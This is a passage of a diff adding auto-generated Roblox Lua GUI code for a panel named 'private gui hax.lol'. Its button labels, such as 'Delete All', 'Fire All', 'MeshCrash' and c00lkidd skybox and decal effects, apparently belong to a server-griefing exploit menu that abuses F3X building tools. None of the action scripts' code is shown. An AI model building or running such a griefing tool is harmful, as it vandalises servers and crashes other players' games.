+G2L["68"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["68"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["68"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["68"]["Text"] = [[Fencing Restore 2]];
+G2L["68"]["Name"] = [[Button]];
+G2L["68"]["Position"] = UDim2.new(0.02034, 0, 0.16347, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+G2L["69"] = Instance.new("LocalScript", G2L["68"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button
+G2L["6a"] = Instance.new("TextButton", G2L["2c"]);
+G2L["6a"]["TextWrapped"] = true;
+G2L["6a"]["BorderSizePixel"] = 3;
+G2L["6a"]["TextSize"] = 14;
+G2L["6a"]["TextScaled"] = true;
+G2L["6a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["6a"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["6a"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["6a"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["6a"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["6a"]["Text"] = [[c00lkidd Disco Fog]];
+G2L["6a"]["Name"] = [[Button]];
+G2L["6a"]["Position"] = UDim2.new(0.21127, 0, 0.16347, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+G2L["6b"] = Instance.new("LocalScript", G2L["6a"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button
+G2L["6c"] = Instance.new("TextButton", G2L["2c"]);
+G2L["6c"]["TextWrapped"] = true;
+G2L["6c"]["BorderSizePixel"] = 3;
+G2L["6c"]["TextSize"] = 14;
+G2L["6c"]["TextScaled"] = true;
+G2L["6c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["6c"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["6c"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["6c"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["6c"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["6c"]["Text"] = [[Delete c00lkidd Disco Fog]];
+G2L["6c"]["Name"] = [[Button]];
+G2L["6c"]["Position"] = UDim2.new(0.41315, 0, 0.16347, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+G2L["6d"] = Instance.new("LocalScript", G2L["6c"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button
+G2L["6e"] = Instance.new("TextButton", G2L["2c"]);
+G2L["6e"]["TextWrapped"] = true;
+G2L["6e"]["BorderSizePixel"] = 3;
+G2L["6e"]["TextSize"] = 14;
+G2L["6e"]["TextScaled"] = true;
+G2L["6e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["6e"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["6e"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["6e"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["6e"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["6e"]["Text"] = [[Rotate Spam F3X]];
+G2L["6e"]["Name"] = [[Button]];
+G2L["6e"]["Position"] = UDim2.new(0.80908, 0, 0.16347, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+G2L["6f"] = Instance.new("LocalScript", G2L["6e"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button
+G2L["70"] = Instance.new("TextButton", G2L["2c"]);
+G2L["70"]["TextWrapped"] = true;
+G2L["70"]["BorderSizePixel"] = 3;
+G2L["70"]["TextSize"] = 14;
+G2L["70"]["TextScaled"] = true;
+G2L["70"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["70"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["70"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["70"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["70"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["70"]["Text"] = [[Delete All]];
+G2L["70"]["Name"] = [[Button]];
+G2L["70"]["Position"] = UDim2.new(0.60876, 0, 0.16347, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+G2L["71"] = Instance.new("LocalScript", G2L["70"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button
+G2L["72"] = Instance.new("TextButton", G2L["2c"]);
+G2L["72"]["TextWrapped"] = true;
+G2L["72"]["BorderSizePixel"] = 3;
+G2L["72"]["TextSize"] = 14;
+G2L["72"]["TextScaled"] = true;
+G2L["72"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["72"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["72"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["72"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["72"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["72"]["Text"] = [[cZerkidd SkyBox]];
+G2L["72"]["Name"] = [[Button]];
+G2L["72"]["Position"] = UDim2.new(0.02034, 0, 0.1843, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+G2L["73"] = Instance.new("LocalScript", G2L["72"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button
+G2L["74"] = Instance.new("TextButton", G2L["2c"]);
+G2L["74"]["TextWrapped"] = true;
+G2L["74"]["BorderSizePixel"] = 3;
+G2L["74"]["TextSize"] = 14;
+G2L["74"]["TextScaled"] = true;
+G2L["74"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["74"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["74"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["74"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["74"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["74"]["Text"] = [[cZerkidd Decal]];
+G2L["74"]["Name"] = [[Button]];
+G2L["74"]["Position"] = UDim2.new(0.21127, 0, 0.1843, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+G2L["75"] = Instance.new("LocalScript", G2L["74"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button
+G2L["76"] = Instance.new("TextButton", G2L["2c"]);
+G2L["76"]["TextWrapped"] = true;
+G2L["76"]["BorderSizePixel"] = 3;
+G2L["76"]["TextSize"] = 14;
+G2L["76"]["TextScaled"] = true;
+G2L["76"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["76"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["76"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["76"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["76"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["76"]["Text"] = [[Raining Toads]];
+G2L["76"]["Name"] = [[Button]];
+G2L["76"]["Position"] = UDim2.new(0.41315, 0, 0.1843, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+G2L["77"] = Instance.new("LocalScript", G2L["76"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button
+G2L["78"] = Instance.new("TextButton", G2L["2c"]);
+G2L["78"]["TextWrapped"] = true;
+G2L["78"]["BorderSizePixel"] = 3;
+G2L["78"]["TextSize"] = 14;
+G2L["78"]["TextScaled"] = true;
+G2L["78"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["78"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["78"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["78"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["78"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["78"]["Text"] = [[ToadRoast]];
+G2L["78"]["Name"] = [[Button]];
+G2L["78"]["Position"] = UDim2.new(0.60876, 0, 0.1843, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+G2L["79"] = Instance.new("LocalScript", G2L["78"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button
+G2L["7a"] = Instance.new("TextButton", G2L["2c"]);
+G2L["7a"]["TextWrapped"] = true;
+G2L["7a"]["BorderSizePixel"] = 3;
+G2L["7a"]["TextSize"] = 14;
+G2L["7a"]["TextScaled"] = true;
+G2L["7a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["7a"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["7a"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["7a"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["7a"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["7a"]["Text"] = [[Part RainBow Balls Raining F3X]];
+G2L["7a"]["Name"] = [[Button]];
+G2L["7a"]["Position"] = UDim2.new(0.80908, 0, 0.1843, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["7b"] = Instance.new("TextButton", G2L["7a"]);
+G2L["7b"]["TextWrapped"] = true;
+G2L["7b"]["BorderSizePixel"] = 3;
+G2L["7b"]["TextSize"] = 14;
+G2L["7b"]["TextScaled"] = true;
+G2L["7b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["7b"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["7b"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["7b"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["7b"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["7b"]["Text"] = [[Big Raining Particles]];
+G2L["7b"]["Name"] = [[Button]];
+G2L["7b"]["Position"] = UDim2.new(-5.30993, 0, 1.36259, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["7c"] = Instance.new("LocalScript", G2L["7b"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["7d"] = Instance.new("TextButton", G2L["7a"]);
+G2L["7d"]["TextWrapped"] = true;
+G2L["7d"]["BorderSizePixel"] = 3;
+G2L["7d"]["TextSize"] = 14;
+G2L["7d"]["TextScaled"] = true;
+G2L["7d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["7d"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["7d"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["7d"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["7d"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["7d"]["Text"] = [[Sparkle All]];
+G2L["7d"]["Name"] = [[Button]];
+G2L["7d"]["Position"] = UDim2.new(-4.02571, 0, 1.36259, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["7e"] = Instance.new("LocalScript", G2L["7d"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["7f"] = Instance.new("TextButton", G2L["7a"]);
+G2L["7f"]["TextWrapped"] = true;
+G2L["7f"]["BorderSizePixel"] = 3;
+G2L["7f"]["TextSize"] = 14;
+G2L["7f"]["TextScaled"] = true;
+G2L["7f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["7f"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["7f"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["7f"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["7f"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["7f"]["Text"] = [[anonymous Face self]];
+G2L["7f"]["Name"] = [[Button]];
+G2L["7f"]["Position"] = UDim2.new(-2.66782, 0, 1.36259, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["80"] = Instance.new("LocalScript", G2L["7f"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["81"] = Instance.new("TextButton", G2L["7a"]);
+G2L["81"]["TextWrapped"] = true;
+G2L["81"]["BorderSizePixel"] = 3;
+G2L["81"]["TextSize"] = 14;
+G2L["81"]["TextScaled"] = true;
+G2L["81"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["81"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["81"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["81"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["81"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["81"]["Text"] = [[X-Ray All]];
+G2L["81"]["Name"] = [[Button]];
+G2L["81"]["Position"] = UDim2.new(-1.35203, 0, 1.36259, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["82"] = Instance.new("LocalScript", G2L["81"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["83"] = Instance.new("TextButton", G2L["7a"]);
+G2L["83"]["TextWrapped"] = true;
+G2L["83"]["BorderSizePixel"] = 3;
+G2L["83"]["TextSize"] = 14;
+G2L["83"]["TextScaled"] = true;
+G2L["83"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["83"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["83"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["83"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["83"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["83"]["Text"] = [[Noot Noot Script]];
+G2L["83"]["Name"] = [[Button]];
+G2L["83"]["Position"] = UDim2.new(-0.00466, 0, 1.36259, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["84"] = Instance.new("TextButton", G2L["7a"]);
+G2L["84"]["TextWrapped"] = true;
+G2L["84"]["BorderSizePixel"] = 3;
+G2L["84"]["TextSize"] = 14;
+G2L["84"]["TextScaled"] = true;
+G2L["84"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["84"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["84"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["84"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["84"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["84"]["Text"] = [[Raining Tacos]];
+G2L["84"]["Name"] = [[Button]];
+G2L["84"]["Position"] = UDim2.new(-5.30993, 0, 2.73759, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["85"] = Instance.new("LocalScript", G2L["84"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["86"] = Instance.new("TextButton", G2L["7a"]);
+G2L["86"]["TextWrapped"] = true;
+G2L["86"]["BorderSizePixel"] = 3;
+G2L["86"]["TextSize"] = 14;
+G2L["86"]["TextScaled"] = true;
+G2L["86"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["86"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["86"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["86"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["86"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["86"]["Text"] = [[Anonymous Particles All]];
+G2L["86"]["Name"] = [[Button]];
+G2L["86"]["Position"] = UDim2.new(-4.02571, 0, 2.73759, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["87"] = Instance.new("LocalScript", G2L["86"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["88"] = Instance.new("TextButton", G2L["7a"]);
+G2L["88"]["TextWrapped"] = true;
+G2L["88"]["BorderSizePixel"] = 3;
+G2L["88"]["TextSize"] = 14;
+G2L["88"]["TextScaled"] = true;
+G2L["88"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["88"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["88"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["88"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["88"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["88"]["Text"] = [[Skyl0rd SkyBox]];
+G2L["88"]["Name"] = [[Button]];
+G2L["88"]["Position"] = UDim2.new(-2.66782, 0, 2.73759, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["89"] = Instance.new("TextButton", G2L["7a"]);
+G2L["89"]["TextWrapped"] = true;
+G2L["89"]["BorderSizePixel"] = 3;
+G2L["89"]["TextSize"] = 14;
+G2L["89"]["TextScaled"] = true;
+G2L["89"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["89"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["89"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["89"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["89"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["89"]["Text"] = [[Skyl0rd Decal]];
+G2L["89"]["Name"] = [[Button]];
+G2L["89"]["Position"] = UDim2.new(-1.35203, 0, 2.73759, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["8a"] = Instance.new("TextButton", G2L["7a"]);
+G2L["8a"]["TextWrapped"] = true;
+G2L["8a"]["BorderSizePixel"] = 3;
+G2L["8a"]["TextSize"] = 14;
+G2L["8a"]["TextScaled"] = true;
+G2L["8a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["8a"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["8a"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["8a"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["8a"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["8a"]["Text"] = [[Anonymous Particles Self]];
+G2L["8a"]["Name"] = [[Button]];
+G2L["8a"]["Position"] = UDim2.new(-0.00466, 0, 2.73759, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["8b"] = Instance.new("LocalScript", G2L["8a"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["8c"] = Instance.new("TextButton", G2L["7a"]);
+G2L["8c"]["TextWrapped"] = true;
+G2L["8c"]["BorderSizePixel"] = 3;
+G2L["8c"]["TextSize"] = 14;
+G2L["8c"]["TextScaled"] = true;
+G2L["8c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["8c"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["8c"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["8c"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["8c"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["8c"]["Text"] = [[Fire All]];
+G2L["8c"]["Name"] = [[Button]];
+G2L["8c"]["Position"] = UDim2.new(-5.30993, 0, 4.11259, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["8d"] = Instance.new("LocalScript", G2L["8c"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["8e"] = Instance.new("TextButton", G2L["7a"]);
+G2L["8e"]["TextWrapped"] = true;
+G2L["8e"]["BorderSizePixel"] = 3;
+G2L["8e"]["TextSize"] = 14;
+G2L["8e"]["TextScaled"] = true;
+G2L["8e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["8e"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["8e"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["8e"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["8e"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["8e"]["Text"] = [[Big Sparkle All]];
+G2L["8e"]["Name"] = [[Button]];
+G2L["8e"]["Position"] = UDim2.new(-4.02571, 0, 4.11259, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["8f"] = Instance.new("LocalScript", G2L["8e"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["90"] = Instance.new("TextButton", G2L["7a"]);
+G2L["90"]["TextWrapped"] = true;
+G2L["90"]["BorderSizePixel"] = 3;
+G2L["90"]["TextSize"] = 14;
+G2L["90"]["TextScaled"] = true;
+G2L["90"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["90"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["90"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["90"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["90"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["90"]["Text"] = [[Trippify za Skybox]];
+G2L["90"]["Name"] = [[Button]];
+G2L["90"]["Position"] = UDim2.new(-2.66782, 0, 4.11259, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["91"] = Instance.new("LocalScript", G2L["90"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["92"] = Instance.new("TextButton", G2L["7a"]);
+G2L["92"]["TextWrapped"] = true;
+G2L["92"]["BorderSizePixel"] = 3;
+G2L["92"]["TextSize"] = 14;
+G2L["92"]["TextScaled"] = true;
+G2L["92"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["92"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["92"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["92"]["Size"] = UDim2.new(0, 223, 0, 32);
+G2L["92"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["92"]["Text"] = [[MeshCrash (Use for Emergencys Only)]];
+G2L["92"]["Name"] = [[Button]];
+G2L["92"]["Position"] = UDim2.new(-1.35203, 0, 4.11259, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["93"] = Instance.new("LocalScript", G2L["92"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["94"] = Instance.new("TextButton", G2L["7a"]);
+G2L["94"]["TextWrapped"] = true;
+G2L["94"]["BorderSizePixel"] = 3;
+G2L["94"]["TextSize"] = 14;
+G2L["94"]["TextScaled"] = true;
+G2L["94"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["94"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["94"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["94"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["94"]["BorderColor3"] = Color3.fromRGB(255, 0, 0);
+G2L["94"]["Text"] = [[Elv4r0x 666]];
+G2L["94"]["Name"] = [[Button]];
+G2L["94"]["Position"] = UDim2.new(-0.00466, 0, 32.98759, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["95"] = Instance.new("LocalScript", G2L["94"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.TextLabel
+G2L["96"] = Instance.new("TextLabel", G2L["94"]);
+G2L["96"]["TextWrapped"] = true;
+G2L["96"]["BorderSizePixel"] = 0;
+G2L["96"]["TextSize"] = 14;
+G2L["96"]["TextScaled"] = true;
+G2L["96"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["96"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
+G2L["96"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["96"]["BackgroundTransparency"] = 1;
+G2L["96"]["Size"] = UDim2.new(0, 630, 0, 25);
+G2L["96"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["96"]["Text"] = [[-- [ DECALS ] --]];
+G2L["96"]["Position"] = UDim2.new(-5.47955, 0, -1.32347, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["97"] = Instance.new("TextButton", G2L["7a"]);
+G2L["97"]["TextWrapped"] = true;
+G2L["97"]["BorderSizePixel"] = 3;
+G2L["97"]["TextSize"] = 14;
+G2L["97"]["TextScaled"] = true;
+G2L["97"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["97"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["97"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["97"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["97"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["97"]["Text"] = [[SkyBox 2]];
+G2L["97"]["Name"] = [[Button]];
+G2L["97"]["Position"] = UDim2.new(-5.30993, 0, 5.51884, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["98"] = Instance.new("TextButton", G2L["7a"]);
+G2L["98"]["TextWrapped"] = true;
+G2L["98"]["BorderSizePixel"] = 3;
+G2L["98"]["TextSize"] = 14;
+G2L["98"]["TextScaled"] = true;
+G2L["98"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["98"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["98"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["98"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["98"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["98"]["Text"] = [[Decal 2]];
+G2L["98"]["Name"] = [[Button]];
+G2L["98"]["Position"] = UDim2.new(-4.02571, 0, 5.51884, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["99"] = Instance.new("TextButton", G2L["7a"]);
+G2L["99"]["TextWrapped"] = true;
+G2L["99"]["BorderSizePixel"] = 3;
+G2L["99"]["TextSize"] = 14;
+G2L["99"]["TextScaled"] = true;
+G2L["99"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["99"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
